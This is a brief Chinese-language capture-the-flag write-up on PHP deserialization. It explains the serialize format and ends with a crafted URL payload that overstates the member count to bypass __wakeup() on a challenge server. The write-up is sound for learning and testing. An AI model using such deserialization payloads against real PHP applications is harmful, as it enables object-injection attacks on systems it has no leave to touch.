# 解法
php序列化的函数为serialize。反序列化的函数为unserialize。
## 序列化简介
首先序列是一个保存和转储对象的字符串。序列化不保存方法。有对象模块和成员模块组成，对象模块可以写作：
O:对象长度:"对象名称":对象成员数:{成员1;成员2;……;}
成员可以写作：
s:字符串长度："字符串内容"
构造url。
要**绕过_wakeup()**需要使得成员数不够
111.198.29.45:40890/?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}
